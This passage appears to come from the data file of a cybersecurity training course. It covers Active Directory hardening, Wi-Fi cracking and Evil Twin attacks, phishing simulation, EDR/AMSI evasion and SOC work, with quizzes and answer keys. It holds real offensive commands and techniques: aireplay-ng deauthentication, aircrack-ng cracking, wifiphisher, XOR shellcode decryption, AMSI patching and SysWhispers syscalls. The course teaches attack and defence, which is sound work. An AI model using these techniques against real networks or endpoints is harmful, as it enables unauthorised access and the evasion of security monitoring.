        "tip": "The pre-built 'Shortest Paths to Domain Admins' query instantly diagrams the exact multi-hop lateral movement route required to compromise the forest.",
        "terminalCommand": "echo 'BloodHound Neo4j Graf Veritabani Analizi'"
      },
      {
        "heading": "4. AD Hardening: LAPS, Tiering Models & DCSync Detection",
        "content": "Hardening Active Directory against modern enterprise tradecraft:\n- Tiering Architecture:\n  * Tier 0: Domain Controllers and forest keys (isolated from all workstation access).\n  * Tier 1: Enterprise application servers and databases.\n  * Tier 2: End-user endpoints and workstations.\n  * Iron Law: Higher-tier administrative credentials must never be exposed or cached on lower-tier assets.\n- LAPS (Local Administrator Password Solution): Enforces unique, randomized passwords across all local administrator accounts, thwarting Pass-the-Hash lateral movement.",
        "codeSnippet": "# DCSync saldirilarini tespit eden Sigma SIEM kurali mantigi\n# Event ID 4662 (Operation on AD Object)\n# AccessMask: 0x100 (DS-Replication-Get-Changes-All)\n# Domain Controller olmayan istemcilerden gelen replication isteklerini alarmlayin!",
        "tip": "During a DCSync attack, Mimikatz impersonates a Domain Controller via DRSUAPI replication; alert immediately on DS-Replication requests originating from non-DC IP addresses.",
        "terminalCommand": "echo 'LAPS ve Active Directory Tier-0 Savunmasi'"
      }
    ],
    "quiz": {
      "question": "Which Kerberos ticket is requested and subsequently cracked offline during a Kerberoasting attack?",
      "options": [
        "TGS (Ticket Granting Service Ticket)",
        "TGT (Ticket Granting Ticket)",
        "PAC (Privilege Attribute Certificate)",
        "AS-REP Ticket"
      ],
      "correct": 0,
      "explanation": "Kerberoasting requests TGS service tickets for SPN accounts. Because the ticket envelope is encrypted with the service account's NTLM hash, it is cracked offline via GPU."
    }
  },
  "wireless-social-eng": {
    "phaseTitle": "Phase 5: Wireless & Social Engineering",
    "title": "Wireless Network Attacks & Social Engineering",
    "difficulty": "Intermediate",
    "duration": "55 min",
    "summary": "Intercept the airwaves and exploit the human firewall. WPA2 4-Way Handshake cracking with Aircrack-ng, Evil Twin rogue access points, Spear Phishing, and social engineering.",
    "sections": [
      {
        "heading": "1. 802.11 Wi-Fi Architecture, Monitor Mode & Packet Injection",
        "content": "Wireless networks broadcast frames over open radio frequencies, lacking traditional physical perimeters:\n- Managed Mode: Network cards process frames directed exclusively to their own MAC address.\n- Monitor Mode: RF interfaces capture all ambient wireless 802.11 frames regardless of association or encryption.\n- Packet Injection: Enables transmitting custom raw frames (deauthentication, disassociation) into the airspace.",
        "codeSnippet": "# Ag kartini monitor moduna alma ve cevreyi tarama\nsudo airmon-ng start wlan0\nsudo airodump-ng wlan0mon",
        "tip": "Packet injection mandates specialized wireless chipset support (e.g. Atheros AR9271, Ralink RT3070, Realtek RTL8812AU).",
        "terminalCommand": "iwconfig 2>/dev/null || echo 'Kablosuz ag arayuzu kontrol edildi'"
      },
      {
        "heading": "2. WPA2 4-Way Handshake Capture & Deauthentication",
        "content": "WPA2-PSK relies on a 4-Way Handshake to derive pairwise transient keys (PTK) without transmitting the passphrase:\n- Attack Lifecycle:\n  1. Lock airodump-ng onto the target BSSID and operational channel.\n  2. Transmit deauthentication frames via aireplay-ng to sever legitimate client connections.\n  3. The victim station automatically re-associates with the access point.\n  4. The 4-Way Handshake (EAPOL frames) is captured and written to a .cap archive.\n  5. The captured PMK/handshake blob is attacked offline via Hashcat (-m 22000).",
        "codeSnippet": "# Istemciyi agdan dusurerek handshake yakalamayi tetikleme\nsudo aireplay-ng -0 5 -a [MODEM_BSSID] -c [ISTEMCI_MAC] wlan0mon\n\n# Yakalanan handshake'i RockYou kelime listesi ile kirmak\naircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap",
        "tip": "WPA3 mandates Protected Management Frames (PMF), cryptographically authenticating deauthentication frames to thwart handshake capture.",
        "terminalCommand": "aircrack-ng --help | head -10"
      },
      {
        "heading": "3. Evil Twin Attacks & Rogue Captive Portals",
        "content": "An Evil Twin mimics the legitimate target SSID and BSSID on higher amplification to lure victims into associating:\n- Execution: Continuous deauthentication frames suppress the genuine AP. Victims migrate to the rogue access point offering superior signal strength.\n- Rogue Captive Portal: Intercepts HTTP traffic, redirecting users to a counterfeit 'Firmware Update' portal prompting for the wireless passphrase.",
        "codeSnippet": "# Airgeddon veya Wifiphisher ile otomatik Evil Twin saldirisi\nwifiphisher --essid \"Sirket_Guest\" -p firmware-upgrade",
        "tip": "Enterprise deployments must replace WPA-Personal with 802.1X WPA-Enterprise backed by RADIUS servers and client certificate validation.",
        "terminalCommand": "echo 'Evil Twin & Rogue Access Point Similasyonu'"
      },
      {
        "heading": "4. Social Engineering, Spear Phishing & GoPhish",
        "content": "The human element remains the most vulnerable interface in enterprise security architectures:\n- Phishing Classifications:\n  * Mass Phishing: High-volume generic delivery notifications or invoice lures.\n  * Spear Phishing: Hyper-targeted lures constructed from meticulous OSINT analysis of specific employees.\n  * Whaling: High-stakes campaigns specifically tailored for C-suite executive financial authorization channels.\n- GoPhish Framework: Open-source enterprise phishing simulation server tracking click rates, credential inputs, and training needs.",
        "codeSnippet": "# GoPhish Server Kurulumu ve Baslatma\nchmod +x gophish\n./gophish\n# Yonetim Paneli: https://127.0.0.1:3333",
        "tip": "Enforce strict email authentication standards: configure SPF, DKIM, and DMARC with 'p=reject' policies to prevent executive domain spoofing.",
        "terminalCommand": "echo 'GoPhish Guvenlik Farkindalik Modulu'"
      }
    ],
    "quiz": {
      "question": "Which cryptographic communication packets must be captured during client re-association to crack WPA2 passphrases offline?",
      "options": [
        "4-Way Handshake (EAPOL Packets)",
        "Beacon Frames",
        "Probe Requests",
        "DHCP Offer Frames"
      ],
      "correct": 0,
      "explanation": "The 4-Way Handshake relies on EAPOL frames to exchange cryptographic nonces necessary to verify candidate passphrases offline."
    }
  },
  "red-team-evasion": {
    "phaseTitle": "Phase 6: Red Teaming & Evasion",
    "title": "Red Team Operations & AV/EDR Evasion",
    "difficulty": "Advanced",
    "duration": "85 min",
    "summary": "Pierce modern endpoint detection ecosystems. Antivirus/EDR internal architecture, signature heuristics, Direct System Calls, NTDLL Unhooking, and in-memory process injection.",
    "sections": [
      {
        "heading": "1. Antivirus & EDR Internal Mechanics",
        "content": "Modern endpoint protection platforms evaluate suspicious executables across three defensive tiers:\n- Static Analysis: Evaluates file hashes, byte signatures, entropy, and Import Address Table (IAT) function references upon disk write.\n- Dynamic Behavioral Heuristics: Monitors runtime process spawns, network sockets, and privilege modifications.\n- User-Mode API Hooking: EDRs inject custom DLLs into spawned processes, rewriting the first bytes of ntdll.dll routines with JMP instructions routing execution through inspection engines.",
        "codeSnippet": "// Klasik bir EDR User-Mode Kancasi (JMP Hook)\n// Orjinal ntdll.dll:\n// mov r10, rcx\n// mov eax, 18h\n// syscall\n// EDR Tarafından Değiştirilmiş Hali:\n// jmp edr_sensor.dll+0x1337",
        "tip": "Antivirus evaluates static binary artifacts on disk; EDR continuously inspects live memory structures and parent-child telemetry at runtime.",
        "terminalCommand": "echo 'EDR Hooking Mimarisi Incelendi'"
      },
      {
        "heading": "2. Static Evasion: Obfuscation & Shellcode Encryption",
        "content": "Preventing static file detections requires encrypting payload shellcode prior to binary compilation:\n- AES-256 / Multi-byte XOR Obfuscation: Embeds payload shellcode as encrypted blobs. Decryption occurs purely within RAM prior to thread execution.\n- Dynamic API Resolution: Strips dangerous APIs (VirtualAlloc, WriteProcessMemory) from the IAT, resolving pointers dynamically via GetProcAddress and LoadLibraryA.\n- Entropy Management: Highly packed or encrypted buffers exhibit abnormal Shannon entropy; camouflage payloads within legitimate assets or steganographic image frames.",
        "codeSnippet": "// C++ ile XOR Sifreli Shellcode Cozme Ornegi\nvoid DecryptPayload(char* data, size_t size, char key) {\n    for (size_t i = 0; i < size; i++) {\n        data[i] ^= key;\n    }\n}",
        "tip": "Bypass AMSI (Antimalware Scan Interface) by patching the prologue of 'AmsiScanBuffer' in amsi.dll memory to return S_OK without inspecting scripts.",
        "terminalCommand": "echo 'AMSI Bypass & Obfuscation Teknikleri'"
      },
      {
        "heading": "3. Dynamic Evasion: Direct System Calls & NTDLL Unhooking",
        "content": "Bypassing user-mode EDR inspection hooks via advanced low-level techniques:\n- Direct System Calls: Rather than calling hooked ntdll wrappers, assembly routines execute CPU 'syscall' instructions directly, jumping straight into kernel-mode without traversing EDR sensors (SysWhispers).\n- NTDLL Unhooking (Perun's Fart): Reads a fresh, pristine copy of ntdll.dll from disk and overwrites the hooked .text section in process memory, scrubbing away EDR trampolines.",
        "codeSnippet": "# SysWhispers3 ile Direct Syscall uretme komutu\npython syswhispers.py -a x64 -c msvc -f NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscalls",
        "tip": "Next-generation EDRs detect Direct Syscalls by checking if the RIP register points outside ntdll. Address this using 'Indirect Syscalls' that jump back to benign syscall stubs within ntdll.",
        "terminalCommand": "echo 'Direct & Indirect Syscalls Mimarisi'"
      },
      {
        "heading": "4. Defense: Attack Surface Reduction (ASR) & ETW Telemetry",
        "content": "Enterprise telemetry engineering to counter elite evasion tradecraft:\n- Attack Surface Reduction (ASR): Blocks Office macros and script hosts from spawning child shells or injecting into other processes.\n- Event Tracing for Windows (ETW): Kernel-level telemetry pipeline logging memory allocation and thread creation independent of user-mode hooks.\n- Kernel Callbacks: Modern EDR sensors prioritize PsSetCreateProcessNotifyRoutine and ObRegisterCallbacks in Ring 0, where user-mode evasion holds zero effect.",
        "codeSnippet": "# PowerShell ile ASR Kurallarini aktiflestirme\nSet-MpPreference -AttackSurfaceReductionRules_Ids D4F940AB-401B-4EFC-AADC-AD5F3C50688A -AttackSurfaceReductionRules_Actions Enabled",
        "tip": "Adversaries counter kernel telemetry via Bring Your Own Vulnerable Driver (BYOVD), dropping legitimate signed but vulnerable drivers to disable kernel callbacks.",
        "terminalCommand": "echo 'Attack Surface Reduction (ASR) Kurallari'"
      }
    ],
    "quiz": {
      "question": "Which Red Team evasion technique bypasses user-mode ntdll.dll EDR hooks by directly invoking CPU syscall instructions to communicate with the kernel?",
      "options": [
        "Direct System Calls",
        "DLL Hijacking",
        "Buffer Overflow",
        "Pass-the-Hash"
      ],
      "correct": 0,
      "explanation": "Direct System Calls load the appropriate syscall SSN into CPU registers and trigger execution directly, avoiding user-mode inspection trampolines entirely."
    }
  },
  "blue-team-career": {
    "phaseTitle": "Phase 7: Blue Team, SOC & Career Roadmap",
    "title": "Blue Team, SOC Operations & Career Roadmap",
    "difficulty": "Beginner",
    "duration": "60 min",
    "summary": "The nerve center of defensive security. SOC operations, SIEM correlation, Windows Event IDs, Sigma detection rules, NIST Incident Response, and global cyber certification pathways.",
    "sections": [
      {
        "heading": "1. Security Operations Center (SOC) Architecture & Roles",
        "content": "A Security Operations Center (SOC) operates 24/7/365 as the defensive nerve center detecting and containing enterprise cyber threats:\n- Tiered Analyst Hierarchy:\n  * Tier 1 (Triage Analyst): First responder reviewing high-volume SIEM alerts, discarding false positives, and escalating verified incidents.\n  * Tier 2 (Incident Responder): Conducts deep forensic triage, containment procedures, root-cause investigations, and malware reverse engineering.\n  * Tier 3 (Threat Hunter): Proactively hunts stealthy Advanced Persistent Threats (APTs) dwelling beneath automated alert thresholds.\n  * SOC Manager: Coordinates personnel, technology integrations, SLAs, and executive incident reporting.",
        "codeSnippet": "# SOC Triage Is Akisi:\n# Alarm Geldi -> Korelasyon Incelemesi -> IP/Domain Itibar Kontrolu (VirusTotal) ->\n# False Positive ise Kapat / True Positive ise Tier 2'ye Eskale Et",
        "tip": "Mastering defensive security requires a profound baseline understanding of benign network and operating system telemetry: you cannot identify anomalies without knowing normalcy.",
        "terminalCommand": "uptime"
      },
      {
        "heading": "2. SIEM, SOAR & Critical Windows Event IDs",
        "content": "SIEM engines ingest, normalize, and correlate terabytes of telemetry across enterprise networks (Splunk, Elastic, Microsoft Sentinel):\n- Critical Windows Security Event IDs:\n  * 4624: Successful Logon (Type 10: RDP, Type 3: Network/SMB)\n  * 4625: Failed Logon (Essential for brute-force alerting)\n  * 4688: A new process has been created (with command line auditing)\n  * 4720: A user account was created\n  * 4672: Special privileges assigned to new logon\n  * 1102: The audit log was cleared (Adversary anti-forensics indicator)",
        "codeSnippet": "# PowerShell ile son 5 basarisiz giris denemesini sorgulama\nGet-WinEvent -FilterHashtable @{LogName='Security';ID=4625} -MaxEvents 5 | Format-Table TimeCreated, Message -AutoSize",
        "tip": "Deploy Microsoft Sysmon across endpoints: Event ID 1 (Process Create), Event ID 3 (Network Connect), and Event ID 8 (CreateRemoteThread) capture advanced adversary implants reliably.",
        "terminalCommand": "dmesg | tail -10 2>/dev/null || echo 'Sistem loglari hazir'"
      },
      {
        "heading": "3. Incident Response (IR) Lifecycle & Forensics",
        "content": "When active intrusions unfold, structured response follows the standardized NIST SP 800-61 Incident Handling lifecycle:\n1. Preparation: Deploying instrumentation, incident playbooks, and forensic toolchains.\n2. Detection & Analysis: Validating indicators of compromise (IOCs) and determining intrusion boundaries.\n3. Containment: Isolating infected hosts from the network perimeter to arrest lateral movement.\n4. Eradication: Purging persistence mechanisms, backdoors, and compromised identities.\n5. Recovery: Restoring hardened configurations from trusted baselines into production.\n6. Lessons Learned: Post-incident review documenting root causes and updating defensive rules.",
        "codeSnippet": "# Linux'ta Olay Mudahalesi Durumunda Calisan Supheli Baglantilari Bulma\nnetstat -pant | grep -i established\nlsof -i :4444\nfind /tmp -type f -mtime -1 -exec ls -la {} +",
        "tip": "Never immediately power down an infected host during incident response: shutting down wipes live volatile RAM containing plaintext credentials, active sockets, and injected implants.",
        "terminalCommand": "last -n 5 2>/dev/null || echo 'Son giris kayitlari listelendi'"
      },
      {
        "heading": "4. Cybersecurity Career Roadmap & Industry Certifications",
        "content": "Navigating global career development across cybersecurity:\n- Entry-Level Foundations:\n  * CompTIA Security+: Industry-standard baseline validating foundational security principles.\n  * eJPT: Practical, hands-on junior penetration testing certification.\n- Professional & Advanced Tier:\n  * OSCP (Offensive Security Certified Professional): Highly recognized 24-hour practical exam validating real-world penetration testing tradecraft.\n  * Defensive Specialization: BTL1 (Blue Team Level 1), CompTIA CySA+.\n  * Executive & Governance: CISSP, CISM.\n- Portfolio Strategy: Build a public technical GitHub repository, publish rigorous CTF write-ups, and author open-source security utilities.",
        "codeSnippet": "# Profesyonel Siber Guvenlik Calisma Rutini:\n# 1. Her gun 1 HackTheBox / TryHackMe / BZT-CTF Makinesi Coz\n# 2. Cozdugun makinenin teknik raporunu (Write-up) cikar\n# 3. GitHub portfoyune duzenli kod commiti yap",
        "tip": "Certifications earn interview invitations; deep hands-on problem solving developed in real-world CTF labs secures the offer.",
        "terminalCommand": "echo 'BZT Siber Guvenlik Egitim Yolculugu Basariyla Tamamlandi!'"
      }
    ],
    "quiz": {
      "question": "In Windows Security Event Logs, which Event ID indicates the creation of a new process?",
      "options": [
        "4688",
        "4624",
        "4625",
        "1102"
      ],
      "correct": 0,
      "explanation": "Event ID 4688 records new process creation. When command-line auditing is enabled, it captures full parameters, making it indispensable for threat detection."
    }
  }
};
